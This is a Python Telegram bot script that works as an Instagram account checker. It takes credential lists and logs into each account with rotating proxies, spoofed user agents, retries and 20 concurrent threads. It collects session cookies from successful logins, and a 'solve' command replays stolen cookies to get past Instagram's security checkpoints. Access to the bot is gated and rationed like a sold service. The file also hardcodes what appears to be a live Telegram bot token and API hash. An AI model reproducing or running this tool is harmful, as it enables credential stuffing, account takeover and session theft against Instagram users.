#!/data/data/com.termux/files/usr/bin/python3
"""
Instagram Premium Bot V8 (Aggressive Login)
Features:
- Retry Logic (2 Attempts per account)
- Relaxed Validation (Accepts sessionid immediately)
- Hybrid Headers (Mobile + Desktop)
- GitHub Database & Admin Controls
"""

import os
import sys
import asyncio
import logging
import sqlite3
import subprocess
import time
import re
import uuid
import secrets
import random
import json
import base64
from datetime import datetime, timedelta
from pathlib import Path

# ============================================
# SECTION 1: DEPENDENCIES
# ============================================
def install_dependencies():
    required = ['pyrogram', 'tgcrypto', 'instaloader', 'pyotp', 'requests']
    for pkg in required:
        try: __import__(pkg)
        except ImportError:
            subprocess.check_call([sys.executable, "-m", "pip", "install", pkg])

install_dependencies()

from pyrogram import Client, filters
from pyrogram.types import Message, InlineKeyboardMarkup, InlineKeyboardButton, CallbackQuery
import instaloader
from instaloader import TwoFactorAuthRequiredException, BadCredentialsException, ConnectionException
import pyotp
import requests

class Config:
    API_ID = 36021238
    API_HASH = "8f9bf7770e5b58b550030bcbaa0ec7d7"
    BOT_TOKEN = "8274795288:AAHDbqKWe1XpM4_xJppY9PED_1TtmAeCX1o"
    
    ADMIN_ID = 6323050876
    CHANNEL_ID = -1003375283491
    CHANNEL_LINK = "https://t.me/Sheet_short_update"
    
    SESSION_NAME = "ig_aggressive_v8"
    WORKDIR = Path("ig_data")
    WORKDIR.mkdir(exist_ok=True)
    
    # GITHUB CONFIG
    GITHUB_TOKEN = "ghp_xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx" 
    GITHUB_REPO = "YourUsername/YourRepoName" 
    DB_FILENAME = "users_db.json"

# GLOBAL STATE
class GlobalState:
    USE_PROXY = True
    THREADS = 20

logging.basicConfig(level=logging.ERROR)

# ============================================
# SECTION 2: GITHUB DATABASE
# ============================================
class GitHubDB:
    def __init__(self):
        self.api_url = f"https://api.github.com/repos/{Config.GITHUB_REPO}/contents/{Config.DB_FILENAME}"
        self.headers = {"Authorization": f"token {Config.GITHUB_TOKEN}", "Accept": "application/vnd.github.v3+json"}
        self.local_cache = {}
        self.load_from_github()

    def load_from_github(self):
        try:
            r = requests.get(self.api_url, headers=self.headers)
            if r.status_code == 200:
                content = r.json().get("content", "")
                if content:
                    self.local_cache = json.loads(base64.b64decode(content).decode("utf-8"))
            else: self.local_cache = {}
        except: self.local_cache = {}

    def save_to_github(self):
        try:
            r = requests.get(self.api_url, headers=self.headers)
            sha = r.json().get("sha") if r.status_code == 200 else None
            data = {
                "message": "Update",
                "content": base64.b64encode(json.dumps(self.local_cache).encode("utf-8")).decode("utf-8")
            }
            if sha: data["sha"] = sha
            requests.put(self.api_url, headers=self.headers, json=data)
        except: pass

    def set_access(self, uid, sec, lim):
        self.local_cache[str(uid)] = {"expiry": time.time()+sec, "limit": lim}
        self.save_to_github()

    def get_user(self, uid): return self.local_cache.get(str(uid))
    def remove_user(self, uid):
        if str(uid) in self.local_cache:
            del self.local_cache[str(uid)]
            self.save_to_github()
            return True
        return False
    def get_all(self): return self.local_cache

db = GitHubDB()

def check_access(user_id):
    if user_id == Config.ADMIN_ID: return True, "Admin", 999999
    data = db.get_user(user_id)
    if not data: return False, "No Access", 0
    rem = data.get("expiry", 0) - time.time()
    if rem > 0: return True, f"{int(rem//3600)}h", data.get("limit", 100)
    db.remove_user(user_id)
    return False, "Expired", 0

# ============================================
# SECTION 3: CORE ENGINE (AGGRESSIVE)
# ============================================
def load_proxies():
    if not Path("proxies.txt").exists(): return []
    with open("proxies.txt") as f:
        return [l.strip() for l in f if l.strip()]

PROXY_LIST = load_proxies()

def get_headers(mobile=False):
    if mobile:
        return {
            'User-Agent': f'Instagram 269.0.0.18.75 Android ({random.randint(24,30)}/9; 480dpi; 1080x1920; Samsung; SM-G973F; en_US)',
            'Accept-Language': 'en-US',
            'X-IG-App-ID': '936619743392459',
        }
    return {
        'User-Agent': f'Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/{random.randint(120, 125)}.0.0.0 Safari/537.36',
        'Sec-Ch-Ua': '"Chromium";v="124", "Google Chrome";v="124"',
        'Sec-Fetch-Site': 'same-origin',
        'Upgrade-Insecure-Requests': '1'
    }

def attempt_login(L, username, password, key):
    try:
        L.login(username, password)
    except TwoFactorAuthRequiredException:
        if key:
            try:
                clean_key = str(key).replace(" ", "").strip().upper()
                L.two_factor_login(pyotp.TOTP(clean_key).now())
            except: return "2FA_FAIL"
        else: return "NEEDS_2FA"
    except BadCredentialsException: return "WRONG_PASS"
    except ConnectionException: return "CONN_ERR"
    except Exception as e:
        if "checkpoint" in str(e).lower(): return "CHECKPOINT"
        if "feedback_required" in str(e).lower(): return "FEEDBACK_REQ"
        return "ERROR"
    return "SUCCESS"

def process_account(line):
    parts = line.strip().split(None, 2)
    u, p = parts[0], parts[1]
    k = parts[2] if len(parts) > 2 else None
    
    # Retry Logic (2 Attempts)
    for attempt in range(2):
        # Alternate User Agents (Desktop -> Mobile)
        is_mobile = (attempt == 1)
        
        L = instaloader.Instaloader(
            quiet=True,
            user_agent=get_headers(mobile=is_mobile)['User-Agent'],
            max_connection_attempts=1,
            request_timeout=15 
        )
        L.context._session.headers.update(get_headers(mobile=is_mobile))
        
        if PROXY_LIST and GlobalState.USE_PROXY:
            prx = random.choice(PROXY_LIST)
            if len(prx.split(':')) == 2: prx = f"http://{prx}" # Handle IP:PORT
            elif len(prx.split(':')) == 4: # Handle IP:PORT:USER:PASS
                s = prx.split(':'); prx = f"http://{s[2]}:{s[3]}@{s[0]}:{s[1]}"
            L.context._session.proxies = {"http": prx, "https": prx}

        try:
            status = attempt_login(L, u, p, k)
            
            if status == "SUCCESS":
                # Only check if sessionid exists (Relaxed check)
                cookies = L.context._session.cookies.get_dict()
                if 'sessionid' in cookies:
                    # Construct Cookie String
                    if 'ig_did' not in cookies: cookies['ig_did'] = str(uuid.uuid4()).upper()
                    if 'datr' not in cookies: cookies['datr'] = secrets.token_hex(12)
                    
                    prio = ['csrftoken', 'ds_user_id', 'sessionid', 'datr', 'ig_did']
                    c_str = "; ".join([f"{k}={cookies[k]}" for k in prio if k in cookies])
                    
                    # Add remaining
                    for key, val in cookies.items():
                        if key not in prio: c_str += f"; {key}={val}"
                        
                    return True, f"{u}|{p}|{c_str}"
            
            # If failed, wait slightly before retry
            if attempt == 0: time.sleep(2)
            
        except: pass

    return False, f"{u}|{p}|LOGIN_FAILED"

# --- Solver (Close Button Logic) ---
def solve_checkpoint_logic(line):
    try:
        parts = line.strip().split('|')
        if len(parts) < 3: return False, "FMT"
        u, p, c = parts[0], parts[1], parts[2]
        
        L = instaloader.Instaloader(quiet=True, user_agent=get_headers(mobile=True)['User-Agent'])
        if PROXY_LIST and GlobalState.USE_PROXY: 
            prx = random.choice(PROXY_LIST)
            if len(prx.split(':')) == 4: 
                s = prx.split(':'); prx = f"http://{s[2]}:{s[3]}@{s[0]}:{s[1]}"
            L.context._session.proxies = {"http": prx, "https": prx}
            
        cd = {i.split('=')[0].strip(): i.split('=')[1].strip() for i in c.split(';') if '=' in i}
        L.context._session.cookies.update(cd)
        
        try:
            # Simulate Close by hitting Profile
            instaloader.Profile.from_username(L.context, u)
            
            nc = L.context._session.cookies.get_dict()
            if 'sessionid' not in nc and 'sessionid' in cd: nc['sessionid'] = cd['sessionid']
            
            c_str = "; ".join([f"{k}={v}" for k,v in nc.items()])
            return True, f"{u}|{p}|{c_str}"
        except: return False, "LOCKED"
    except: return False, "ERR"

# ============================================
# SECTION 4: BOT
# ============================================
app = Client(Config.SESSION_NAME, api_id=Config.API_ID, api_hash=Config.API_HASH, bot_token=Config.BOT_TOKEN)

async def check_perm(client, uid):
    if uid == Config.ADMIN_ID: return True, "Admin", 999999
    valid, time, lim = check_access(uid)
    if not valid: return False, "exp", 0
    try:
        await client.get_chat_member(Config.CHANNEL_ID, uid)
        return True, time, lim
    except: return False, "join", 0

@app.on_message(filters.command("start"))
async def start(c, m):
    uid = m.from_user.id
    ok, tm, lim = await check_perm(c, uid)
    global PROXY_LIST; PROXY_LIST = load_proxies()
    
    if ok:
        await m.reply_text(
            f"💠 **IG AGGRESSIVE BOT V8**\n"
            f"👤 User: `{uid}`\n"
            f"⏳ Time: `{tm}` | 🔢 Limit: `{lim}`\n"
            f"🌐 Proxies: `{len(PROXY_LIST)}` ({'ON' if GlobalState.USE_PROXY else 'OFF'})\n"
            f"⚡ Threads: `{GlobalState.THREADS}`"
        )
    elif tm == "join":
        btn = InlineKeyboardMarkup([[InlineKeyboardButton("📢 Join", url=Config.CHANNEL_LINK)],[InlineKeyboardButton("✅ Verify", "verify_join")]])
        await m.reply_text("🚫 **Join Channel First**", reply_markup=btn)
    else: await m.reply_text("🔒 **No Access**")

@app.on_callback_query(filters.regex("verify_join"))
async def verify(c, q):
    ok, _, _ = await check_perm(c, q.from_user.id)
    if ok: await q.message.delete(); await start(c, q.message)
    else: await q.answer("❌ Not Joined/Expired", show_alert=True)

@app.on_message(filters.command(["on", "off"]) & filters.user(Config.ADMIN_ID))
async def sw(c, m):
    if "proxies" in m.text:
        GlobalState.USE_PROXY = (m.command[0] == "on")
        GlobalState.THREADS = 20 if GlobalState.USE_PROXY else 5
        await m.reply(f"🔧 Proxy: {GlobalState.USE_PROXY} | Threads: {GlobalState.THREADS}")

@app.on_message(filters.command("access") & filters.user(Config.ADMIN_ID))
async def acc(c, m):
    try:
        _, t, d, l = m.command
        sec = int(re.match(r"(\d+)", d).group(1)) * (86400 if 'd' in d else 3600)
        db.set_access(int(t), sec, int(l))
        await m.reply("✅ Done")
    except: await m.reply("❌ Error")

@app.on_message(filters.command("solve"))
async def slv(c, m):
    if not m.reply_to_message and len(m.command) < 2: return await m.reply("❌ Reply to list")
    lines = (m.text.split(None, 1)[1] if len(m.command)>1 else m.reply_to_message.text).split('\n')
    msg = await m.reply("🔧 Solving...")
    
    res = await asyncio.gather(*[asyncio.to_thread(solve_checkpoint_logic, l) for l in lines if l.strip()])
    valid = [r[1] for r in res if r[0]]
    
    if valid:
        with open("Fixed.txt", "w") as f: f.write("\n".join(valid))
        await m.reply_document("Fixed.txt", caption=f"✅ Fixed: {len(valid)}")
        os.remove("Fixed.txt")
    else: await msg.edit("❌ Failed")

@app.on_message(filters.text & filters.private)
async def login(c, m):
    if m.text.startswith("/"): return
    uid = m.from_user.id
    ok, _, lim = await check_perm(c, uid)
    if not ok: return await m.reply("⛔ No Access")
    
    lines = [l for l in m.text.split('\n') if l.strip()]
    if len(lines) > lim: return await m.reply(f"❌ Limit: {lim}")
    if not PROXY_LIST and GlobalState.USE_PROXY: return await m.reply("⚠️ No Proxies")

    msg = await m.reply(f"💎 Checking {len(lines)} accounts...")
    
    suc, fail, proc = [], [], 0
    sem = asyncio.Semaphore(GlobalState.THREADS)
    last = time.time()

    async def task(line):
        nonlocal proc, last
        async with sem:
            ok, res = await asyncio.to_thread(process_account, line)
            if ok: suc.append(res)
            else: fail.append(res)
            proc += 1
            if time.time()-last > 3:
                try: await msg.edit(f"💎 Run: {proc}/{len(lines)}\n✅ {len(suc)} | ❌ {len(fail)}"); last=time.time()
                except: pass

    await asyncio.gather(*[task(l) for l in lines])
    
    if suc:
        with open("Success.txt", "w") as f: f.write("\n".join(suc))
        await m.reply_document("Success.txt", caption=f"✅ Valid: {len(suc)}")
        os.remove("Success.txt")
    if fail:
        with open("Failed.txt", "w") as f: f.write("\n".join(fail))
        await m.reply_document("Failed.txt", caption=f"❌ Failed: {len(fail)}")
        os.remove("Failed.txt")

if __name__ == "__main__":
    print("🔥 Aggressive Bot V8 Started...")
    app.run()
